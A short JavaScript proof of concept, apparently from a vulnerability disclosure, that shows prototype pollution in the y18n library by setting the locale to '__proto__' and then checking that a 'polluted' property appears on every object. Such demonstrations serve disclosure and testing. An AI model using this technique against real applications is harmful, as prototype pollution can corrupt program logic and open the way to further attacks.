RegExp.prototype.test = () => true;
const y18n = require('y18n')();
obj = {};
console.log({}.polluted);
y18n.setLocale('__proto__');
y18n.updateLocale({ polluted: 'yes' });
console.log({}.polluted);